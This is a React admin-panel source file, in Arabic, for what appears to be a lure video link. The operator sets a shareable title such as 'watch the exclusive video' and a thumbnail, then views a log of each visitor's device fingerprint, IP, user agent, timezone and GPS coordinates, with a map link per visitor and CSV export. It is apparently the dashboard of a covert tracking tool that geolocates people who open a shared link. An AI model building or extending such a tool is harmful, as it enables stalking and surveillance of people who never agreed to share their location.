"use client";

import { useEffect, useState } from 'react';
import { UploadButton } from "@/utils/uploadthing";

type Log = {
  id: string;
  fingerprint: string;
  latitude: number | null;
  longitude: number | null;
  userAgent: string | null;
  ip: string | null;
  screenResolution: string | null;
  language: string | null;
  timezone: string | null;
  createdAt: string;
};

export default function AdminPanel() {
  const [videoUrl, setVideoUrl] = useState('');
  const [title, setTitle] = useState('');
  const [thumbnailUrl, setThumbnailUrl] = useState('');
  
  const [logs, setLogs] = useState<Log[]>([]);
  const [message, setMessage] = useState('');

  useEffect(() => {
    fetch('/api/video')
      .then(res => res.json())
      .then(data => {
        setVideoUrl(data.videoUrl || '');
        setTitle(data.title || '');
        setThumbnailUrl(data.thumbnailUrl || '');
      });

    fetch('/api/log')
      .then(res => res.json())
      .then(data => setLogs(data.logs || []));
  }, []);

  const handleUpdateVideo = async (e: React.FormEvent) => {
    e.preventDefault();
    setMessage('جاري تحديث الرابط...');
    
    const res = await fetch('/api/video', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ videoUrl })
    });
    
    if (res.ok) {
      setMessage('تم تحديث الرابط بنجاح!');
    } else {
      const errData = await res.json().catch(() => ({}));
      setMessage(`حدث خطأ أثناء التحديث: ${errData.error || res.statusText}`);
    }
    
    setTimeout(() => setMessage(''), 3000);
  };

  const handleUpdateMetadata = async (e: React.FormEvent) => {
    e.preventDefault();
    setMessage('جاري حفظ الاسم...');
    
    const res = await fetch('/api/video', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title })
    });
    
    if (res.ok) {
      setMessage('تم تحديث عنوان الفيديو بنجاح!');
    } else {
      const errData = await res.json().catch(() => ({}));
      setMessage(`حدث خطأ: ${errData.error || res.statusText}`);
    }
    
    setTimeout(() => setMessage(''), 3000);
  };

  const exportToCSV = () => {
    if (logs.length === 0) {
      alert('لا توجد بيانات لتصديرها');
      return;
    }
    
    const headers = ['الوقت والتاريخ', 'بصمة الجهاز', 'الإحداثيات', 'IP', 'نظام التشغيل', 'معلومات الجهاز'];
    
    const rows = logs.map(log => {
      const date = new Date(log.createdAt).toLocaleString('ar-EG');
      const coords = log.latitude && log.longitude ? `${log.latitude}, ${log.longitude}` : '-';
      const device = `الشاشة: ${log.screenResolution || '-'} | اللغة: ${log.language || '-'} | المنطقة: ${log.timezone || '-'}`;
      
      return [
        `"${date}"`,
        `"${log.fingerprint}"`,
        `"${coords}"`,
        `"${log.ip || '-'}"`,
        `"${log.userAgent || '-'}"`,
        `"${device}"`
      ].join(',');
    });
    
    const csvContent = "data:text/csv;charset=utf-8,\uFEFF" + headers.join(',') + '\n' + rows.join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", `video_logs_${new Date().toISOString().split('T')[0]}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div style={{ padding: '1rem', maxWidth: '1200px', margin: '0 auto', fontFamily: 'Arial, sans-serif' }} dir="rtl">
      
      <div style={{ textAlign: 'center', marginBottom: '1.5rem' }}>
        <h1 style={{ color: '#1b7bc2', fontSize: '2rem' }}>لوحة التحكم المراقبة</h1>
      </div>

      <div style={{ display: 'flex', flexWrap: 'wrap', gap: '10px', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem' }}>
        <h2 style={{ fontSize: '1.5rem', margin: 0 }}>سجل الزيارات</h2>
        <div style={{ display: 'flex', gap: '10px' }}>
          <button className="btn" style={{ backgroundColor: '#28a745', color: 'white', padding: '10px 15px', border: 'none', borderRadius: '4px', cursor: 'pointer', fontSize: '14px' }} onClick={exportToCSV}>حفظ كملف Excel (CSV)</button>
          <button className="btn" style={{ backgroundColor: '#d9534f', color: 'white', padding: '10px 15px', border: 'none', borderRadius: '4px', cursor: 'pointer', fontSize: '14px' }} onClick={() => window.location.href = '/'}>عودة للمشغل</button>
        </div>
      </div>

      <div style={{ backgroundColor: 'white', padding: '1rem', borderRadius: '8px', boxShadow: '0 4px 6px rgba(0,0,0,0.1)', marginBottom: '2rem' }}>
        <h3 style={{ margin: 0 }}>إعدادات الفيديو</h3>
        
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '20px', marginTop: '1rem' }}>
          
          {/* Metadata Settings */}
          <div style={{ border: '1px solid #eee', padding: '15px', borderRadius: '8px' }}>
            <h4 style={{ marginBottom: '15px', color: '#333' }}>الاسم والصورة (يظهر عند مشاركة الرابط)</h4>
            
            <form onSubmit={handleUpdateMetadata} style={{ marginBottom: '15px', display: 'flex', gap: '10px' }}>
              <input 
                type="text" 
                value={title}
                onChange={(e) => setTitle(e.target.value)}
                style={{ flex: 1, padding: '10px', borderRadius: '4px', border: '1px solid #ccc' }}
                placeholder="اسم أو عنوان الفيديو (مثال: شاهد الفيديو حصرياً)"
                required
              />
              <button type="submit" className="btn" style={{ padding: '10px 15px', backgroundColor: '#1b7bc2', color: 'white', border: 'none', borderRadius: '4px' }}>حفظ الاسم</button>
            </form>

            <div style={{ marginTop: '20px' }}>
              <h5 style={{ marginBottom: '10px', fontSize: '14px', color: '#555' }}>تغيير الصورة المصغرة (Thumbnail):</h5>
              {thumbnailUrl && (
                <div style={{ marginBottom: '10px' }}>
                  <img src={thumbnailUrl} alt="Thumbnail" style={{ width: '100px', height: 'auto', borderRadius: '4px', border: '1px solid #ddd' }} />
                </div>
              )}
              <UploadButton
                endpoint="imageUploader"
                onClientUploadComplete={(res) => {
                  if (res && res.length > 0) {
                    setThumbnailUrl(res[0].url);
                    setMessage('تم حفظ الصورة المصغرة بنجاح!');
                  }
                }}
                onUploadError={(error: Error) => {
                  setMessage(`حدث خطأ أثناء رفع الصورة: ${error.message}`);
                }}
                appearance={{
                  button: { backgroundColor: '#1b7bc2', padding: '5px 15px', fontSize: '14px' }
                }}
              />
            </div>
          </div>

          {/* Video URL Settings */}
          <div style={{ border: '1px solid #eee', padding: '15px', borderRadius: '8px' }}>
            <h4 style={{ marginBottom: '15px', color: '#333' }}>ملف الفيديو الأساسي</h4>
            
            <form onSubmit={handleUpdateVideo} style={{ marginBottom: '15px', display: 'flex', flexDirection: 'column', gap: '10px' }}>
              <label style={{ fontSize: '13px', color: '#555' }}>رابط مباشر خارجي (يوتيوب أو غيره):</label>
              <div style={{ display: 'flex', gap: '10px' }}>
                <input 
                  type="url" 
                  value={videoUrl}
                  onChange={(e) => setVideoUrl(e.target.value)}
                  style={{ flex: 1, padding: '10px', borderRadius: '4px', border: '1px solid #ccc' }}
                  placeholder="أدخل رابط الفيديو"
                  required
                  dir="ltr"
                />
                <button type="submit" className="btn" style={{ padding: '10px 15px', backgroundColor: '#1b7bc2', color: 'white', border: 'none', borderRadius: '4px' }}>تحديث الرابط</button>
              </div>
            </form>

            <div style={{ marginTop: '20px', borderTop: '1px dashed #ccc', paddingTop: '15px' }}>
              <h5 style={{ marginBottom: '10px', fontSize: '14px', color: '#555' }}>أو رفع فيديو من جهازك للسحابة الدائمة:</h5>
              <UploadButton
                endpoint="videoUploader"
                onClientUploadComplete={(res) => {
                  if (res && res.length > 0) {
                    setVideoUrl(res[0].url);
                    setMessage('تم رفع الفيديو وحفظه بنجاح للأبد! 🚀');
                  }
                }}
                onUploadError={(error: Error) => {
                  setMessage(`حدث خطأ أثناء رفع الفيديو: ${error.message}`);
                }}
                appearance={{
                  button: { backgroundColor: '#28a745', padding: '10px 20px', width: '100%' }
                }}
              />
            </div>
          </div>

        </div>

        {message && <p style={{ marginTop: '1rem', color: '#28a745', fontWeight: 'bold', fontSize: '15px', textAlign: 'center', backgroundColor: '#f8fff9', padding: '10px', borderRadius: '4px', border: '1px solid #28a745' }}>{message}</p>}
      </div>

      <div style={{ overflowX: 'auto', backgroundColor: 'white', boxShadow: '0 4px 6px rgba(0,0,0,0.1)', borderRadius: '8px' }}>
        <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'center', fontSize: '13px', minWidth: '800px' }}>
          <thead>
            <tr style={{ backgroundColor: '#1b7bc2', color: 'white' }}>
              <th style={{ padding: '10px', border: '1px solid #dee2e6' }}>الوقت والتاريخ</th>
              <th style={{ padding: '10px', border: '1px solid #dee2e6' }}>بصمة الجهاز</th>
              <th style={{ padding: '10px', border: '1px solid #dee2e6' }}>الإحداثيات</th>
              <th style={{ padding: '10px', border: '1px solid #dee2e6' }}>IP</th>
              <th style={{ padding: '10px', border: '1px solid #dee2e6' }}>نظام التشغيل</th>
              <th style={{ padding: '10px', border: '1px solid #dee2e6' }}>معلومات الجهاز</th>
              <th style={{ padding: '10px', border: '1px solid #dee2e6' }}>الخريطة</th>
            </tr>
          </thead>
          <tbody>
            {logs.map(log => {
              const date = new Date(log.createdAt);
              return (
                <tr key={log.id} style={{ borderBottom: '1px solid #dee2e6' }}>
                  <td style={{ padding: '10px', border: '1px solid #dee2e6' }}>
                    {date.toLocaleDateString('ar-EG')}<br/>
                    {date.toLocaleTimeString('ar-EG')}
                  </td>
                  <td style={{ padding: '10px', border: '1px solid #dee2e6', wordBreak: 'break-all' }}>{log.fingerprint}</td>
                  <td style={{ padding: '10px', border: '1px solid #dee2e6' }} dir="ltr">
                    {log.latitude && log.longitude ? `${log.latitude.toFixed(5)}, ${log.longitude.toFixed(5)}` : '-'}
                  </td>
                  <td style={{ padding: '10px', border: '1px solid #dee2e6' }} dir="ltr">{log.ip || '-'}</td>
                  <td style={{ padding: '10px', border: '1px solid #dee2e6', maxWidth: '200px', wordBreak: 'break-word', fontSize: '12px', color: '#555' }} dir="ltr">
                    {log.userAgent || '-'}
                  </td>
                  <td style={{ padding: '10px', border: '1px solid #dee2e6', fontSize: '12px', color: '#555', textAlign: 'right' }}>
                    <div>الشاشة: {log.screenResolution || '-'}</div>
                    <div>اللغة: {log.language || '-'}</div>
                    <div>المنطقة: {log.timezone || '-'}</div>
                  </td>
                  <td style={{ padding: '10px', border: '1px solid #dee2e6' }}>
                    {log.latitude && log.longitude ? (
                      <a 
                        href={`https://www.google.com/maps?q=${log.latitude},${log.longitude}`} 
                        target="_blank" 
                        rel="noreferrer" 
                        style={{ color: '#6610f2', textDecoration: 'underline' }}
                      >
                        عرض الخريطة
                      </a>
                    ) : '-'}
                  </td>
                </tr>
              );
            })}
            {logs.length === 0 && (
              <tr>
                <td colSpan={7} style={{ padding: '20px', textAlign: 'center' }}>لا توجد سجلات حتى الآن</td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}
